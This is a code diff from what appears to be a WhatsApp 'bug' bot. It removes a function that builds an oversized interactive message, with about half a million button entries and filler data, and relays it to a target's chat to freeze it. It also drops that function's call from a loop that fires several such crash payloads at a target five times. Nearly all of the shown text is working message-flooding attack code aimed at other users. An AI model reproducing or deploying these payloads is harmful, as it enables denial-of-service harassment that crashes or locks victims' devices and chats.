@@ -1542,65 +1542,6 @@ async function emmalocalautism(sock, target) {
   });
 }
 
-async function stucklgoo(sock, target) {
-  try {
-    const payload = {
-      viewOnceMessage: {
-        message: {
-          interactiveMessage: {
-            header: {
-              title: "JavaScript",
-              hasMediaAttachment: false
-            },
-            body: {
-              text: "LOCK CHAT BY @KintanaOfficial"
-            },
-            nativeFlowMessage: {
-              messageParamsJson: JSON.stringify({
-                placeholderResendMessage: "placeholderResendMessage",
-                testPayload: Buffer.from(
-                  Array.from({ length: 1500 }, () => 0x5A)
-                ).toString("base64")
-              }),
-              buttons: Array.from({ length: 500550 }, (_, i) => {
-                if (i === 0) {
-                  return {
-                    name: "quick_reply",
-                    buttonParamsJson: JSON.stringify({
-                      display_text: "Oke",
-                      id: "oke_btn"
-                    })
-                  };
-                }
-                return {};
-              }),
-              messageVersion: 3
-            },
-            contextInfo: {
-              forwardingScore: 999,
-              isForwarded: true,
-              isAiGenerated: true,
-              businessMessageForwardInfo: {
-                businessOwnerJid: "13135550002@s.whatsapp.net"
-              }
-            }
-          }
-        }
-      }
-    };
-
-    await sock.relayMessage(target, payload, {
-      participant: true,
-      noSelfSync: true,
-      messageId: "3EB0" + Math.random().toString(36).substring(2, 12).toUpperCase()
-    });
-
-    console.log(`[+] Meta AI Lock Chat Overlay terkirim ke ${target}`);
-  } catch (err) {
-    console.error("[-] Gagal kirim:", err.message);
-  }
-}
-
 async function halonyet(sock, target) {
     const msg = {
         groupStatusMessageV2: {
@@ -1843,7 +1784,6 @@ async function bug2(sock, target) {
   for (let i = 0; i < 5; i++) {
     try {
       await emmalocalautism(sock, target);
-      await stucklgoo(sock, target);
       await halonyet(sock, target);
       console.log(`bug send to ${target}`);
     } catch (innerError) {
